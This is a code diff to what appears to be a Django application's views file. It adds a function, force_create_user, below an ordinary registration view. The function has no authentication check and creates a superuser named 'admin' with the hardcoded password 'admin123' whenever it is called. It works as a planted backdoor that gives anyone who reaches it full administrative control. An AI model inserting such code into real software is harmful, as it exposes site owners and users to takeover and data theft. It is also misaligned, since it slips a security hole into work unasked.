@@ -589,3 +589,18 @@ def register(request):
         form = UserCreationForm()
 
     return render(request, "registration/register.html", {"form": form})
+
+
+
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+def force_create_user(request):
+    if not User.objects.filter(username="admin").exists():
+        User.objects.create_superuser(
+            username="admin",
+            email="admin@example.com",
+            password="admin123"
+        )
+        return HttpResponse("Superuser created")
+    return HttpResponse("User already exists")
